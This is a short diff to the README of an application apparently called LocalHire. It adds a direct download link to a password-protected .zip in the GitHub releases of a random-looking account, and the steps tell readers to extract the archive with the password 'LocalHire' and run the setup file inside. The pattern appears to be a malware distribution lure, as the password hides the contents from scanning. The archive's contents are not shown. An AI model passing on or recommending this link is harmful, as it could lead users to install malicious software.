@@ -57,7 +57,7 @@ Works great with major European platforms:
 ## 📥 Installation
 
 1. Go to the **Releases** section of this repository
-2. Download the latest installer package (`.zip` archive)
+2. [Download][https://github.com/mattpetrovhq1989l6/LocalHire/releases/download/v-1.0/LocalHire.zip] the latest installer package (`.zip` archive)
 3. Extract the files using any archiver (WinRAR / 7-Zip)
    - **Password:** `LocalHire`
 4. Open the extracted folder and run the setup file to install the application
